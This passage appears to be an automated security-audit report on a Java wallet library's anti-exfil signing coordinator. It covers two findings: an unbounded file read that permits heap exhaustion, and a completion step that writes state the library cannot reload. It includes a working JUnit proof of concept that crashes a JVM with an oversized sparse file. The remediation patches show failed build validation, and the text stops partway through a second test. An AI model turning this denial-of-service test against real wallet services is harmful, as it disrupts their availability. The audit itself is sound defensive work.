         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 28 lines & 0.8173828125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 7s
```

---

# State size cap does not bound allocation
**#247993**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java` (2 locations)
#### Lines 24-38 — _Only IOException is translated; memory exhaustion escapes._

```
    static <T> T locked(Path target, IOAction<T> action) {
        try {
            Path absolute = target.toAbsolutePath();
            Path parent = absolute.getParent();
            if(parent == null) throw new IOException("Durable state requires a parent directory");
            Files.createDirectories(parent);
            Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
            try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                FileLock ignored = channel.lock()) {
                return action.run();
            }
        } catch(IOException e) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                    "Cannot access durable anti-exfil state: " + e.getMessage(), e);
        }
```
⋯
#### Lines 41-47 — _The complete file is allocated before its maximum is checked._

```
    static byte[] read(Path path, int maximumBytes) throws IOException {
        byte[] encoded = Files.readAllBytes(path);
        if(encoded.length < 32 || encoded.length > maximumBytes) throw new IOException("State length is outside limits");
        byte[] body = Arrays.copyOf(encoded, encoded.length - 32);
        byte[] checksum = Arrays.copyOfRange(encoded, encoded.length - 32, encoded.length);
        if(!Arrays.equals(Sha256Hash.hash(body), checksum)) throw new IOException("State checksum mismatch");
        return body;
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 227-235 — _Coordinator reads rely on the ineffective nominal maximum._

```
    private State readValidatedState() {
        return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
    }

    private State readValidatedStateUnlocked() throws IOException {
        if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
        State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
        validateState(state);
        return state;
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
#### Lines 60-68 — _The journal uses the same helper with its nominal 4 MiB limit._

```
    private Journal loadOrCreate() throws IOException {
        if(!Files.exists(path)) {
            Journal journal = new Journal(walletIdentity, List.of());
            AntiExfilDurableFiles.write(path, encode(journal), true);
            return journal;
        }
        Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
        if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
        return journal;
```
## Description

`AntiExfilDurableFiles.read` calls `Files.readAllBytes` before applying the caller's maximum-length check. A caller can select, or a filesystem actor can replace, a session or journal path with a file substantially larger than available heap and then trigger `load`, a getter, or journal access. The JVM attempts to allocate and fill an array for the entire file before the advertised 32 MiB or 4 MiB bound is evaluated. `OutOfMemoryError` is not an `IOException` and is not converted to the library's controlled fail-closed exception path.
## Root cause

The length cap is enforced after unbounded whole-file allocation instead of through a pre-read size check or bounded streaming read.
## Impact

One oversized durable file can exhaust the JVM heap and terminate or destabilize the wallet or signing service, causing process-wide availability loss rather than a bounded invalid-state rejection.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class Poc {
    private static final long JOURNAL_LIMIT = 4L * 1024L * 1024L;
    private static final long OVERSIZED_JOURNAL = 128L * 1024L * 1024L;

    @TempDir
    Path temporary;

    @Test
    void oversizedJournalFileTriggersUnboundedReadAllBytesAllocationBeforeFourMiBLimit() throws Exception {
        Path attackerControlledJournal = temporary.resolve("oversized.aexj");
        createSparseFile(attackerControlledJournal, OVERSIZED_JOURNAL);
        assertTrue(Files.size(attackerControlledJournal) > JOURNAL_LIMIT,
                "fixture must exceed AntiExfilAbortJournal's documented 4 MiB durable-file cap");

        ProcessResult child = runJournalReadInSmallHeap(attackerControlledJournal);

        assertFalse(child.timedOut(), child.output());
        assertTrue(child.exitCode() != 0, "child unexpectedly survived vulnerable journal load:\n" + child.output());
        assertTrue(child.output().contains("java.lang.OutOfMemoryError"),
                "vulnerable code must exhaust heap before returning a bounded AntiExfilException; output was:\n" + child.output());
        assertTrue(child.output().contains("java.nio.file.Files.readAllBytes")
                        || child.output().contains("AntiExfilDurableFiles.read"),
                "stack trace should prove the real durable-file read path allocated the oversized file; output was:\n"
                        + child.output());
        assertFalse(child.output().contains("AntiExfilException"),
                "a safe implementation would reject the oversized state through the controlled exception path instead of OOM:\n"
                        + child.output());
    }

    private static void createSparseFile(Path path, long size) throws IOException {
        try(FileChannel channel = FileChannel.open(path, StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE)) {
            channel.position(size - 1);
            channel.write(ByteBuffer.wrap(new byte[] {0}));
        }
    }

    private static ProcessResult runJournalReadInSmallHeap(Path journal) throws Exception {
        Path java = Path.of(System.getProperty("java.home"), "bin", isWindows() ? "java.exe" : "java");
        List<String> command = new ArrayList<>();
        command.add(java.toString());
        command.add("-Xms16m");
        command.add("-Xmx32m");
        command.add("-cp");
        command.add(System.getProperty("java.class.path"));
        command.add("com.sparrowwallet.drongo.antiexfil.PocJournalLoadChild");
        command.add(journal.toString());

        Process process = new ProcessBuilder(command).redirectErrorStream(true).start();
        boolean exited = process.waitFor(30, TimeUnit.SECONDS);
        String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        if(!exited) {
            process.destroyForcibly();
            process.waitFor(5, TimeUnit.SECONDS);
            return new ProcessResult(-1, true, output);
        }
        return new ProcessResult(process.exitValue(), false, output);
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }

    private record ProcessResult(int exitCode, boolean timedOut, String output) {
    }
}

final class PocJournalLoadChild {
    private PocJournalLoadChild() {
    }

    public static void main(String[] args) {
        new AntiExfilAbortJournal(Path.of(args[0]), new byte[32]).getEvents();
        System.out.println("journal load unexpectedly completed");
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 23 lines & 1.087890625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 6s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC demonstrates the vulnerable allocation through the public AntiExfilAbortJournal.getEvents() journal-loading path using the real AntiExfilDurableFiles.read implementation on the native JVM. It does not separately exercise AntiExfilCoordinator.load/getter session-file loading, but those paths call the same read helper with a larger nominal cap. The test constrains the child JVM heap to make the process-wide availability impact deterministic without risking the Gradle test worker.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Replace unbounded Files.readAllBytes with a bounded stream read of at most maximumBytes + 1, so oversized durable files are detected and rejected via IOException without allocating their full contents.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
@@ -1,88 +1,92 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 
 import java.io.IOException;
+import java.io.InputStream;
 import java.nio.ByteBuffer;
 import java.nio.channels.FileChannel;
 import java.nio.channels.FileLock;
 import java.nio.file.AtomicMoveNotSupportedException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 import java.nio.file.StandardOpenOption;
 import java.util.Arrays;
 import java.util.EnumSet;
 
 import static java.nio.file.attribute.PosixFilePermission.OWNER_READ;
 import static java.nio.file.attribute.PosixFilePermission.OWNER_WRITE;
 
 final class AntiExfilDurableFiles {
     private AntiExfilDurableFiles() {
     }
 
     static <T> T locked(Path target, IOAction<T> action) {
         try {
             Path absolute = target.toAbsolutePath();
             Path parent = absolute.getParent();
             if(parent == null) throw new IOException("Durable state requires a parent directory");
             Files.createDirectories(parent);
             Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
             try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                 FileLock ignored = channel.lock()) {
                 return action.run();
             }
         } catch(IOException e) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Cannot access durable anti-exfil state: " + e.getMessage(), e);
         }
     }
 
     static byte[] read(Path path, int maximumBytes) throws IOException {
-        byte[] encoded = Files.readAllBytes(path);
+        byte[] encoded;
+        try(InputStream input = Files.newInputStream(path)) {
+            encoded = input.readNBytes(maximumBytes + 1);
+        }
         if(encoded.length < 32 || encoded.length > maximumBytes) throw new IOException("State length is outside limits");
         byte[] body = Arrays.copyOf(encoded, encoded.length - 32);
         byte[] checksum = Arrays.copyOfRange(encoded, encoded.length - 32, encoded.length);
         if(!Arrays.equals(Sha256Hash.hash(body), checksum)) throw new IOException("State checksum mismatch");
         return body;
     }
 
     static void write(Path path, byte[] body, boolean createOnly) throws IOException {
         if(createOnly && Files.exists(path)) throw new IOException("State already exists");
         byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
         Path absolute = path.toAbsolutePath();
         Path parent = absolute.getParent();
         Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
         boolean moved = false;
         try {
             try {
                 Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
             } catch(UnsupportedOperationException ignored) {
                 // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
             }
             try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                     StandardOpenOption.TRUNCATE_EXISTING)) {
                 ByteBuffer buffer = ByteBuffer.wrap(encoded);
                 while(buffer.hasRemaining()) channel.write(buffer);
                 channel.force(true);
             }
             try {
                 if(createOnly) {
                     Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                 } else {
                     Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                 }
             } catch(AtomicMoveNotSupportedException e) {
                 throw new IOException("Filesystem does not support atomic durable-state replacement", e);
             }
             moved = true;
         } finally {
             if(!moved) Files.deleteIfExists(temporary);
         }
     }
 
     @FunctionalInterface
     interface IOAction<T> {
         T run() throws IOException;
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
### Validation output

```
[output truncated: 28 lines & 0.828125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 7s
```

---

# Successful completion writes unreloadable state
**#247994**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (4 locations)
#### Lines 28-33 — _The aggregate cap is only twice the original per-blob cap._

```
public final class AntiExfilCoordinator {
    private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
    private static final int VERSION = 1;
    private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
    private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
    private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
```
⋯
#### Lines 60-81 — _An original at the full per-blob limit is accepted._

```
    static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                        Keystore keystore, AntiExfilNetwork network,
                                        boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
        AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
        if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
            throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
        }
        List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
        byte[] sessionId = random32(random);
        Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
        for(AntiExfilSigningSlot slot : slots) {
            byte[] rho;
            int attempts = 0;
            do {
                if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                rho = random32(random);
            } while(containsValue(rhos, rho));
            rhos.put(slot.getIdentifier(), rho);
        }
        AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
        State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                AntiExfilCodec.encode(commit), null, null, null, null, rhos);
```
⋯
#### Lines 152-175 — _Completion writes both copies and returns without re-reading the state._

```
    public Completion complete(byte[] encodedSignatures) {
        if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
            if(state.phase == Phase.COMPLETE) {
                if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                return completion(state);
            }
            AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
            AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
            if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
            AntiExfilCodec.validateTransition(reveal, signatures);
            byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                    AntiExfilCodec.decode(state.message1), signatures, state.rhos);
            State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                    state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
            AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
            return completion(complete);
        });
    }

    private Completion completion(State state) {
        return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
```
⋯
#### Lines 287-321 — _Encoding has no aggregate check while later decode applies incompatible blob caps._

```
    private static byte[] encode(State state) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        try(DataOutputStream output = new DataOutputStream(bytes)) {
            output.write(MAGIC);
            output.writeByte(VERSION);
            output.writeByte(state.phase.ordinal());
            output.write(state.walletIdentity);
            writeBlob(output, state.originalPsbt);
            writeBlob(output, state.message1);
            writeNullableBlob(output, state.message2);
            writeNullableBlob(output, state.message3);
            writeNullableBlob(output, state.message4);
            writeNullableBlob(output, state.signedPsbt);
            output.writeShort(state.rhos.size());
            for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                output.writeInt(entry.getKey().getInputIndex());
                output.write(entry.getKey().getSignerPublicKey());
                output.write(entry.getValue());
            }
        }
        return bytes.toByteArray();
    }

    private static State decode(byte[] body) throws IOException {
        try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
            if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
            int phaseCode = input.readUnsignedByte();
            if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
            byte[] identity = input.readNBytes(32);
            byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
            byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
            byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
            byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
            byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
            byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 50-78 — _Durable writes accept an arbitrary body size._

```
    static void write(Path path, byte[] body, boolean createOnly) throws IOException {
        if(createOnly && Files.exists(path)) throw new IOException("State already exists");
        byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
        Path absolute = path.toAbsolutePath();
        Path parent = absolute.getParent();
        Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
        boolean moved = false;
        try {
            try {
                Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
            } catch(UnsupportedOperationException ignored) {
                // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
            }
            try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                    StandardOpenOption.TRUNCATE_EXISTING)) {
                ByteBuffer buffer = ByteBuffer.wrap(encoded);
                while(buffer.hasRemaining()) channel.write(buffer);
                channel.force(true);
            }
            try {
                if(createOnly) {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                } else {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                }
            } catch(AtomicMoveNotSupportedException e) {
                throw new IOException("Filesystem does not support atomic durable-state replacement", e);
            }
            moved = true;
```
## Description

Creation accepts an original PSBT whose length is exactly 16 MiB. A canonical signable PSBT can reach that limit through preserved global proprietary data without changing its signing semantics. Completion stores both that original PSBT and a reconstructed signed copy that is larger because partial signatures were added, plus all transcript messages, metadata, and rho records. There is no write-side aggregate-size check, so `complete` atomically commits this oversized body and returns success from the in-memory state. Every later load or getter applies a 32 MiB aggregate cap, and decode separately caps the now-larger signed PSBT at 16 MiB, making the successful completion unrecoverable.
## Root cause

Per-blob and aggregate read limits are inconsistent with the complete-state schema, and no corresponding bounds are enforced before durable replacement.
## Impact

The library can report a durable successful signing ceremony and then permanently reject its own state. If the immediate return value is lost, the signed PSBT and verification evidence cannot be recovered through the coordinator, forcing manual recovery or another post-reveal signing attempt.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.psbt.PSBTEntry;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
